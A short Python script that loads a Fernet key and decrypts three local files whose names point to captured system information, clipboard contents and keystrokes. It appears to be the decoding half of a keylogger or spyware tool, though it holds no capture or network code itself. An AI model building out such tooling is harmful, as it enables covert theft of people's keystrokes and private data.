from cryptography.fernet import Fernet

# Function to load the encryption key
def load_encryption_key():
    try:
        with open("secure_key.bin", 'rb') as key_file:
            key = key_file.read() 
        return key
    except FileNotFoundError:
        print("Key file not found. Please ensure secure_key.bin is present.")
        return None

# Function to decrypt encrypted files and save the decrypted contents
def decrypt_files():
    key = load_encryption_key()  
    if key is None:
        return

    encrypted_files = ['encrypted_system_info.dat', 'encrypted_clipboard.dat', 'encrypted_keys.dat']
    for file in encrypted_files:
        try:
            with open(file, 'rb') as enc_file:
                encrypted_data = enc_file.read()  

            fernet = Fernet(key) 
            decrypted_data = fernet.decrypt(encrypted_data) 

            # Write the decrypted data to a new file
            with open(f"decrypted_{file}", 'wb') as dec_file:
                dec_file.write(decrypted_data)
            print(f"Decrypted file saved as decrypted_{file}")
        except FileNotFoundError:
            print(f"File {file} not found for decryption.")
        except Exception as e:
            print(f"Error decrypting {file}: {e}")

if __name__ == "__main__":
    decrypt_files() 
